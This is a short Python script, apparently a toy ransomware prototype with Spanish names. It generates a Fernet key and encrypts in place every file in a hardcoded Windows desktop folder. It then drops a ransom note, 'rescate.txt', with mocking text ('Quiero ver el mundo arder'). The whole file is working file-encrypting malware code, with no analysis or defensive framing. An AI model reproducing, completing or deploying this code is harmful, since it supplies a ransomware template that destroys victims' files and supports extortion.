from cryptography.fernet import Fernet
import os

def generadorLlave():
    llave = Fernet.generate_key()
    with open('key.key', 'wb') as llave_archivo:
        llave_archivo.write(llave)
def load_key():
    return open('key.key', 'rb').read()
def encriptar(items, llave):
    f = Fernet(llave)
    for item in items:
        with open(item, 'rb') as archivo:
            archivo_data = archivo.read()
        dataEncriptada = f.encrypt(archivo_data)
        with open(item, "wb") as archivo:
            archivo.write(dataEncriptada)
if __name__ == '__main__':
    path_to_encrypt = 'C:\\Users\\SuperGato\\Desktop\\archivos'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+'\\'+item for item in items]
    generadorLlave()
    key = load_key()
    encriptar(full_path, key)

    with open(path_to_encrypt+'\\'+'rescate.txt', 'w') as file:
        file.write('This is a laught with sarcasm')
        file.write('Quiero ver el mundo arder')